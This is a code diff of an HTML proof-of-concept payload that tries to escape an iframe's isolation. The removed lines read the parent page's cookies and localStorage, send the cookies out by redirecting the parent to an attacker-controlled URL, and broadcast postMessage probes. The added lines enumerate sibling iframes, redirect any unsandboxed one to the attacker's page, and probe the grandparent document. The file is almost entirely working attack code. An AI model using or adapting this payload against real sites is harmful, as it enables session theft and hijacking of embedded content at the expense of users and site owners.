@@ -1,46 +1,37 @@
-<!-- https://screenshotsart.store/payload.html -->
 <!doctype html>
 <html>
-	<head>
-		<title>PoC</title>
-	</head>
 	<body>
 		<script>
-			console.log("=== SCREENSHOTSART.STORE PAYLOAD EXECUTING ===");
+			console.log("=== PAYLOAD v2 ===");
 
-			// Check our frame situation
-			console.log("window.origin:", window.origin);
-			console.log("parent origin attempt...");
-
+			// Try to access parent
 			try {
-				console.log("parent.origin:", window.parent.origin);
-				console.log("SAME ORIGIN ACCESS TO PARENT!");
+				const parentDoc = window.parent.document;
+				console.log("🎯 PARENT DOM ACCESS WORKED!");
 
-				// If we get here, we have same-origin access
-				// Try to read sensitive data
-				console.log("parent.document.cookie:", window.parent.document.cookie);
-				console.log("localStorage:", JSON.stringify(window.parent.localStorage));
+				// Find sibling iframes
+				const iframes = parentDoc.querySelectorAll("iframe");
+				console.log("Siblings:", iframes.length);
 
-				// Try navigation
-				window.parent.location.href = "https://screenshotsart.store/pwned?cookies=" + encodeURIComponent(window.parent.document.cookie);
+				iframes.forEach((f, i) => {
+					const sandbox = f.getAttribute("sandbox");
+					console.log(`  [${i}] sandbox: ${sandbox || "NONE"}, src: ${f.src.substring(0, 50)}`);
+
+					if (!sandbox) {
+						console.log("  🔥 UNSANDBOXED! Hijacking...");
+						f.src = "https://screenshotsart.store/victory.html";
+					}
+				});
 			} catch (e) {
-				console.log("Cross-origin blocked:", e.message);
-
-				// Even if cross-origin, check sandbox flags
-				console.log("Checking sandbox escape...");
-				try {
-					// postMessage to parent
-					window.parent.postMessage({ type: "PROBE", from: "screenshotsart" }, "*");
-				} catch (e2) {
-					console.log("postMessage failed:", e2);
-				}
+				console.log("Parent access blocked:", e.message);
 			}
 
-			// Also try top
+			// Also try grandparent
 			try {
-				console.log("top.origin:", window.top.origin);
+				const gpDoc = window.parent.parent.document;
+				console.log("🎯 GRANDPARENT ACCESS WORKED!");
 			} catch (e) {
-				console.log("top access blocked:", e.message);
+				console.log("Grandparent blocked:", e.message);
 			}
 		</script>
 	</body>
